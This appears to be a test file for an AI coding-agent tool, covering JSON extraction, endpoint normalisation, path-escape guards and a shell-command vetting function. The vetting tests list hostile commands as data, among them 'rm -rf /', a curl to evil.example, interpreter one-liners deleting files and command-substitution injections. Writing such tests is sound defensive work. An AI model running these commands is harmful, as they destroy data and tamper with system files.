import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { extractJson } from '../src/llm/client.js';
import { normalizeEndpoint } from '../src/lib/endpoint.js';
import { isInside, resolveInside } from '../src/lib/paths.js';
import { vetCommand } from '../src/lib/shell-vet.js';
import { detectCommand } from '../src/agents/build-check.js';
import type { RepoProfile } from '../src/types.js';

function tmpDir(prefix: string) {
  return fs.mkdtempSync(path.join(os.tmpdir(), `ohpert-${prefix}-`));
}

function profile(patch: Partial<RepoProfile> = {}): RepoProfile {
  return { path: '', scripts: {}, packageManager: null, ...patch } as RepoProfile;
}

test('extractJson reads fenced and embedded JSON, and tolerates trailing commas', () => {
  assert.deepEqual(extractJson('```json\n{"a":1}\n```'), { a: 1 });
  assert.deepEqual(extractJson('分析如下：{"a":{"b":[1,2]}} 完毕'), { a: { b: [1, 2] } });
  assert.deepEqual(extractJson('{"a":1,}'), { a: 1 });
  assert.throws(() => extractJson('没有 JSON'));
});

test('normalizeEndpoint makes frontend and backend paths comparable', () => {
  assert.equal(normalizeEndpoint('/api/user/123'), '/api/user/:param');
  assert.equal(normalizeEndpoint('/api/order/:id/detail/'), '/api/order/:param/detail');
  assert.equal(normalizeEndpoint('http://localhost:3000/api/x?y=1'), '/api/x');
  assert.equal(normalizeEndpoint('${base}/api/items/${id}'), '/api/items/:param');
});

test('vetCommand allows read-only/verification commands', () => {
  for (const cmd of [
    'pnpm run build',
    'pnpm --filter @ohpert/web run typecheck',
    'npm run lint',
    'yarn run test',
    'npx --no-install tsc --noEmit',
    'git status --porcelain',
    'git diff --stat',
    'go build ./...',
    'mvn -q -DskipTests compile',
    'env NODE_ENV=test pnpm run build',
    'nice -n 5 pnpm run build',
    'pnpm run build 2>/dev/null',
    'pnpm run build > build.log',
    'node build.js',
  ]) {
    assert.equal(vetCommand(cmd).ok, true, `should allow: ${cmd}`);
  }
});

test('vetCommand rejects destructive or installing commands, including wrappers', () => {
  for (const cmd of [
    'rm -rf /',
    'sudo ls',
    'sh -c "git push origin main"',
    "bash -c 'npm install lodash'",
    'FOO=1 bash -c "echo hi"',
    'git commit -m x',
    'git -c core.pager=cat commit -m x',
    'git push --force',
    'git worktree add /tmp/x',
    'npm install',
    'pnpm add lodash',
    'yarn remove react',
    'npm exec -- some-package',
    'npx tsc --noEmit',
    'python3 -c "import os; os.system(\'id\')"',
    "node -e \"require('fs').rmSync('/',{recursive:true})\"",
    'node --eval "process.exit(0)"',
    'perl -e "unlink q(/etc/passwd)"',
    'git -c alias.pwn=!sh pwn',
    'echo "$(rm -rf /)"',
    'echo `whoami`',
    'CMD=rm; $CMD -rf /',
    'echo hacked > ~/.zshrc',
    'echo hacked >> /etc/hosts',
    'echo hacked &> /tmp/out',
    'brew install jq',
    'find . -name "*.ts" -delete',
    'curl http://evil.example/x',
    'git status && rm -rf build',
    'echo ok; pnpm dlx cowsay',
  ]) {
    assert.equal(vetCommand(cmd).ok, false, `should reject: ${cmd}`);
  }
  assert.equal(vetCommand('').ok, false);
});

test('resolveInside blocks .. traversal and symlinks that escape the repo', () => {
  const root = tmpDir('root');
  const outside = tmpDir('outside');
  fs.mkdirSync(path.join(root, 'src'));
  fs.writeFileSync(path.join(outside, 'secret.txt'), 'secret');
  fs.symlinkSync(outside, path.join(root, 'link-out'));
  fs.symlinkSync(path.join(outside, 'not-created-yet.txt'), path.join(root, 'dangling'));
  const realRoot = fs.realpathSync(root);

  assert.equal(resolveInside(root, 'src/new-file.ts'), path.join(realRoot, 'src', 'new-file.ts'));
  assert.equal(isInside(root, path.join(root, 'src')), true);
  assert.throws(() => resolveInside(root, '../outside/secret.txt'), /路径越界/);
  assert.throws(() => resolveInside(root, 'link-out/secret.txt'), /符号链接/);
  assert.throws(() => resolveInside(root, 'dangling'), /符号链接/);
});

test('detectCommand uses the repo package manager and wrapper scripts', () => {
  const dir = tmpDir('pm');
  fs.writeFileSync(path.join(dir, 'pnpm-lock.yaml'), '');
  assert.deepEqual(detectCommand(profile({ path: dir, scripts: { build: 'vite build' } })), {
    command: 'pnpm run build',
    label: 'build',
  });
  // profile wins over lockfile sniffing
  fs.writeFileSync(path.join(dir, 'yarn.lock'), '');
  assert.equal(
    detectCommand(profile({ path: dir, packageManager: 'yarn', scripts: { typecheck: 'tsc' } })).command,
    'yarn run typecheck',
  );

  const javaDir = tmpDir('java');
  fs.writeFileSync(path.join(javaDir, 'pom.xml'), '<project/>');
  fs.writeFileSync(path.join(javaDir, 'mvnw'), '#!/bin/sh\n');
  assert.equal(detectCommand(profile({ path: javaDir })).command, './mvnw -q -DskipTests compile');

  const gradleDir = tmpDir('gradle');
  fs.writeFileSync(path.join(gradleDir, 'build.gradle'), '');
  fs.writeFileSync(path.join(gradleDir, 'gradlew'), '#!/bin/sh\n');
  assert.equal(detectCommand(profile({ path: gradleDir })).command, './gradlew compileJava -q');

  assert.equal(detectCommand(undefined).command, null);
});
